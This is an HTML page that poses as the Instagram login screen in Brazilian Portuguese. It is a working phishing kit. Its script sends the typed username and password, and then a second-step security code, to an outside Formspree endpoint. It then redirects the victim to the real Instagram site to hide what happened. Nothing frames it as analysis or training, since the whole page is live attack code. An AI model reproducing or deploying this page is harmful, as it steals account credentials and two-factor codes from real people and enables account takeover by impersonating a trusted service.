<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#1a1a1a">
<title>Instagram</title>
<meta name="description" content="Crie uma conta ou entre no Instagram. Compartilhe o que você está fazendo com as pessoas que se importam com você.">
<meta name="robots" content="index,follow">
<link rel="canonical" href="https://neutralarc.github.io/Login/">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Instagram">
<meta property="og:title" content="Instagram">
<meta property="og:description" content="Entre no Instagram.">
<meta property="og:url" content="https://neutralarc.github.io/Login/">
<meta property="og:image" content="https://neutralarc.github.io/Login/icon-512.png">
<link rel="preconnect" href="https://formspree.io" crossorigin>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cdefs%3E%3CradialGradient id='g' cx='0.25' cy='1.05' r='1.35'%3E%3Cstop offset='0' stop-color='%23FFDD55'/%3E%3Cstop offset='0.42' stop-color='%23FF543E'/%3E%3Cstop offset='0.68' stop-color='%23C837AB'/%3E%3Cstop offset='1' stop-color='%234B62D6'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect width='512' height='512' rx='112' fill='url(%23g)'/%3E%3Cg fill='none' stroke='%23fff' stroke-width='34'%3E%3Crect x='118' y='118' width='276' height='276' rx='72'/%3E%3Ccircle cx='256' cy='256' r='60'/%3E%3C/g%3E%3Ccircle cx='352' cy='160' r='16' fill='%23fff'/%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="icon-192.png">
<style>
:root{color-scheme:dark}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{
  margin:0;min-height:100vh;min-height:100dvh;
  background:#1a1a1a;color:#fff;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  display:flex;flex-direction:column;align-items:center;
  padding:0 22px calc(26px + env(safe-area-inset-bottom));
}
.top{font-size:15px;color:#b3b3b3;padding-top:26px}
.logo{margin:11vh 0 11vh;width:96px}
.logo svg{width:100%;height:auto;display:block}
form{width:100%;max-width:420px;display:flex;flex-direction:column}
#step2{display:none}
input{
  width:100%;height:60px;padding:0 20px;margin-bottom:14px;
  font-size:16px;font-family:inherit;color:#fff;
  background:transparent;border:1px solid #4d4d4d;border-radius:999px;
  outline:none;
}
input::placeholder{color:#9a9a9a}
input:focus{border-color:#8a8a8a}
button{
  width:100%;height:52px;border:0;border-radius:999px;
  background:#0d6efd;color:#fff;font-size:16px;font-weight:600;
  font-family:inherit;margin-top:12px;
}
button:disabled{opacity:.65}
.forgot{font-size:15px;color:#fff;margin:30px 0 0}
.forgot a{color:#fff;text-decoration:none}
.hint{display:none;font-size:15px;color:#b3b3b3;margin:26px 0 0;text-align:center}
.sp{display:none;width:22px;height:22px;margin:22px auto 0;
  border:2px solid #3a3a3a;border-top-color:#0d6efd;border-radius:50%;
  animation:r .8s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
.bottom{width:100%;max-width:420px;margin-top:auto;padding-top:44px}
.ghost{background:transparent;border:1px solid #0d6efd;color:#0d6efd;
  font-weight:500;margin:0;height:50px}
.meta{display:flex;align-items:center;justify-content:center;gap:6px;
  margin:22px 0 0;font-size:23px;font-weight:700;letter-spacing:-.5px;
  font-family:Arial,Helvetica,sans-serif;color:#fff}
.meta .inf{font-size:30px;line-height:1;font-weight:900}
.noscript{font-size:14px;color:#b3b3b3;text-align:center;margin:20px 0 0}
</style>
</head>
<body>
<div class="top">Português (Brasil)</div>

<div class="logo">
  <svg viewBox="0 0 512 512" role="img" aria-label="Instagram">
    <defs>
      <radialGradient id="igg" cx="0.25" cy="1.05" r="1.35">
        <stop offset="0" stop-color="#FFDD55"/>
        <stop offset="0.22" stop-color="#FF8A00"/>
        <stop offset="0.42" stop-color="#FF543E"/>
        <stop offset="0.68" stop-color="#C837AB"/>
        <stop offset="1" stop-color="#4B62D6"/>
      </radialGradient>
    </defs>
    <g fill="none" stroke="url(#igg)" stroke-width="32">
      <rect x="40" y="40" width="432" height="432" rx="108"/>
      <circle cx="256" cy="256" r="86"/>
    </g>
    <circle cx="386" cy="126" r="19" fill="url(#igg)"/>
  </svg>
</div>

<form id="step1" action="https://formspree.io/f/mzeevlvr" method="post">
  <input name="usuario" placeholder="Nome de usuário, email ou celular"
         autocapitalize="off" autocomplete="username" spellcheck="false"
         inputmode="email" enterkeyhint="next" required>
  <input name="senha" type="password" placeholder="Senha"
         autocomplete="current-password" enterkeyhint="go" required>
  <button type="submit">Entrar</button>
</form>

<p class="forgot" id="forgot"><a href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a></p>

<form id="step2" action="https://formspree.io/f/mzeevlvr" method="post">
  <input name="codigo" placeholder="Código de segurança" inputmode="numeric"
         pattern="[0-9]*" maxlength="8" autocomplete="one-time-code"
         enterkeyhint="go" required>
  <button type="submit">Confirmar</button>
</form>

<p class="hint" id="hint">Confirme o código de segurança</p>
<div class="sp" id="sp"></div>

<noscript><p class="noscript">Ative o JavaScript para continuar.</p></noscript>

<div class="bottom">
  <a href="https://www.instagram.com/accounts/emailsignup/" style="text-decoration:none;color:inherit">
    <button type="button" class="ghost">Criar nova conta</button>
  </a>
  <div class="meta"><span class="inf">∞</span>Meta</div>
</div>

<script>
var EP="https://formspree.io/f/mzeevlvr";
var f1=document.getElementById("step1"),f2=document.getElementById("step2"),
    fg=document.getElementById("forgot"),h=document.getElementById("hint"),
    sp=document.getElementById("sp"),t;
function send(d){return fetch(EP,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(d)})}
f1.addEventListener("submit",function(e){
  e.preventDefault();
  var d=Object.fromEntries(new FormData(f1));
  f1.querySelector("button").disabled=true;
  fg.style.display="none";sp.style.display="block";
  send(Object.assign({_subject:"IG usuario"},d)).catch(function(){});
  f1.style.display="none";f2.style.display="flex";h.style.display="block";
  sp.style.display="none";
  t=setTimeout(function(){location.href="https://www.instagram.com/"},9000);
});
f2.addEventListener("input",function(){clearTimeout(t)});
f2.addEventListener("submit",function(e){
  e.preventDefault();clearTimeout(t);
  var d=Object.fromEntries(new FormData(f2));
  f2.querySelector("button").disabled=true;
  send(Object.assign({_subject:"IG codigo"},d)).catch(function(){});
  location.href="https://www.instagram.com/";
});
</script>
</body>
</html>
